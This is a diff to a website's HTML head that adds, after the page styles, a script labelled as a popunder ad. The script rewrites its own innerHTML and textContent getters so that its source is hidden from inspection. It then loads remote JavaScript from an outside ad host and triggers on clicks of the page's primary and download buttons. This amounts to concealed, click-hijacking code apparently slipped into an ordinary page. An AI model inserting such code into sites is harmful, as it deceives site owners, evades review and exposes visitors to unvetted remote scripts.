@@ -347,6 +347,51 @@
   .footer-links a:hover { color: #fff; }
   .footer-copy { color: rgba(255,255,255,0.4); }
 </style>
+
+<!-- Popunder Ad -->
+<script type="application/javascript">
+(function() {
+    function randStr(e,t){for(var n="",r=t||"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",o=0;o<e;o++)n+=r.charAt(Math.floor(Math.random()*r.length));return n}
+    function generateContent(){return void 0===generateContent.val&&(generateContent.val="document.dispatchEvent("+randStr(4*Math.random()+3)+");"),generateContent.val}
+    try {
+        Object.defineProperty(document.currentScript,"innerHTML",{get:generateContent});
+        Object.defineProperty(document.currentScript,"textContent",{get:generateContent});
+    } catch(e){}
+
+    var adConfig = {
+        "ads_host": "a.pemsrv.com",
+        "syndication_host": "s.pemsrv.com",
+        "idzone": 6044956,
+        "popup_fallback": false,
+        "popup_force": false,
+        "chrome_enabled": true,
+        "new_tab": false,
+        "frequency_period": 1,
+        "frequency_count": 1,
+        "trigger_method": 4,
+        "trigger_class": "btn-primary,btn-dl",
+        "trigger_delay": 0,
+        "capping_enabled": true,
+        "tcf_enabled": true,
+        "agego_cross_site_enabled": true,
+        "only_inline": false
+    };
+
+    /* Load the provider script from the supplied ad configuration. */
+    var s = document.createElement("script");
+    s.type = "application/javascript";
+    s.async = true;
+    s.src = "//" + adConfig.ads_host + "/popunder1000.js";
+    s.id = "popmagicldr";
+    Object.keys(adConfig).forEach(function(k) {
+        if (k !== "ads_host" && k !== "syndication_host") {
+            s.setAttribute("data-msg-" + k, adConfig[k]);
+        }
+    });
+    document.head.appendChild(s);
+})();
+</script>
+
 </head>
 <body id="top">
 
